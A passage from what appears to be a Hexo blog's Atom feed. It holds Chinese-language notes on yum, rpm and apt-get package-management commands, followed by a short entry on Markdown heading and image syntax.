class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum安装常用软件的命令</span><br><span class="line"><span class="meta">#</span><span class="bash">yum check-update</span></span><br><span class="line"><span class="meta">#</span><span class="bash">yum remove 软件包名</span></span><br><span class="line"><span class="meta">#</span><span class="bash">yum install 软件包名</span></span><br><span class="line"><span class="meta">#</span><span class="bash">yum update 软件包名</span></span><br><span class="line">yum命令常见使用方法</span><br><span class="line">yum -y install 包名（支持*） ：自动选择y，全自动</span><br><span class="line">yum install 包名（支持*） ：手动选择y or n</span><br><span class="line">yum remove 包名（不支持*）</span><br><span class="line">rpm -ivh 包名（支持*）：安装rpm包</span><br><span class="line">rpm -e 包名（不支持*）：卸载rpm包</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、apt-get安装。"><a href="#二、apt-get安装。" class="headerlink" title="二、apt-get安装。"></a>二、apt-get安装。</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search package 搜索软件包</span><br><span class="line">apt-cache show package 获取包的相关信息，如说明、大小、版本等</span><br><span class="line">sudo apt-get install package 安装包</span><br><span class="line">sudo apt-get install package --reinstall 重新安装包</span><br><span class="line">sudo apt-get -f install 修复安装</span><br><span class="line">sudo apt-get remove package 删除包</span><br><span class="line">sudo apt-get remove package --purge 删除包，包括配置文件等</span><br><span class="line">sudo apt-get update 更新源</span><br><span class="line">sudo apt-get upgrade 更新已安装的包</span><br><span class="line">sudo apt-get dist-upgrade 升级系统</span><br><span class="line">apt-cache depends package 了解使用该包依赖那些包</span><br><span class="line">apt-cache rdepends package 查看该包被哪些包依赖</span><br><span class="line">sudo apt-get build-dep package 安装相关的编译环境</span><br><span class="line">apt-get source package 下载该包的源代码</span><br><span class="line">sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包</span><br><span class="line">sudo apt-get check 检查是否有损坏的依赖</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一般来说著名的linux系统基本上分两大类：&quot;&gt;&lt;a href=&quot;#一般来说著名的linux系统基本上分两大类：&quot; class=&quot;headerlink&quot; title=&quot;一般来说著名的linux系统基本上分两大类：&quot;&gt;&lt;/a&gt;一般来说著名的linux系统基本上分两大</summary>
      
    
    
    
    
    <category term="Linux" scheme="https://cr4ckm3.top/tags/Linux/"/>
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Markdown</title>
    <link href="https://cr4ckm3.top/2016/08/28/Markdown/"/>
    <id>https://cr4ckm3.top/2016/08/28/Markdown/</id>
    <published>2016-08-28T02:47:54.000Z</published>
    <updated>2019-08-30T10:00:39.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p><code># test</code> 一级标题</p><p><code>&lt;!--more--&gt;</code> hexo的阅读全文标签</p><h2 id="test-1"><a href="#test-1" class="headerlink" title="test"></a>test</h2><p><code>## test</code> 二级标题</p><h3 id="test-2"><a href="#test-2" class="headerlink" title="test"></a>test</h3><p><code>### test</code> 三级标题</p><h4 id="test-3"><a href="#test-3" class="headerlink" title="test"></a>test</h4><p><code>#### test</code> 四级标题</p><h5 id="test-4"><a href="#test-4" class="headerlink" title="test"></a>test</h5><p><code>##### test</code> 五级标题</p><p><img src="https://chengui1in.github.io/img/xss.png" alt="image"><br>图片：<code>![name](路径)</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;test&quot;&gt;&lt;a href=&quot;#test&quot; class=&quot;headerlink&quot; title=&quot;test&quot;&gt;&lt;/a&gt;test&lt;/h1&gt;&lt;p&gt;&lt;code&gt;# test&lt;/code&gt; 一级标题&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;!--more--&amp;gt;&lt;/code&gt;</summary>
      
    
    
    
    
    <category term="Markdown" scheme="https://cr4ckm3.top/tags/Markdown/"/>
    
    <category term="test" scheme="https://cr4ckm3.top/tags/test/"/>
    
  </entry>
  
</feed>
